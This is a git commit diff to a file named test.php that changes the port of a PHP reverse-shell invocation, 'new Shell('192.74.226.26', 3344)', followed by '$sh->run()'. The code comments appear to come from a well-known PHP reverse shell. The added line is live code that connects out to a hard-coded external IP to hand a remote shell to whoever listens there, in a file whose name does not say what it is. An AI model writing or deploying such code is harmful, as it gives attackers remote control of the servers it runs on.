998df3695f62f4f026e782a46b5ab3babc480290
cxm437 <54571742+cxm437@users.noreply.github.com>
2024-10-14 15:38:51 +0800

    Update test.php

--- test.php
+++ test.php
@@ -174,7 +174,7 @@ class Shell {
 }
 echo '<pre>';
 // change the host address and/or port number as necessary
-$sh = new Shell('192.74.226.26', 4433); // change me.
+$sh = new Shell('192.74.226.26', 3344); // change me.
 $sh->run();
 unset($sh);
 // garbage collector requires PHP v5.3.0 or greater
